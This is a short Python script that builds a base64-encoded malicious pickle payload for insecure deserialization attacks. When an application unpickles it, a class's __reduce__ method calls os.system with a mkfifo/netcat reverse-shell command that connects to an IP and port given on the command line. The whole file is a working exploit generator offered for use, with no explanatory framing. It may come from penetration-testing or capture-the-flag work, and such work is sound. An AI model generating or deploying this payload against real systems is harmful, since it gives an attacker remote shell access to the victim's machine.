import pickle
import sys
import base64

if len(sys.argv) != 3:
    print('Usage: ' + sys.argv[0] + ' {IP} {PORT}')
    exit()

ip = sys.argv[1]
port = sys.argv[2]

command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | ' '/bin/sh -i 2>&1 | netcat ' + ip + ' ' + port + ' > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))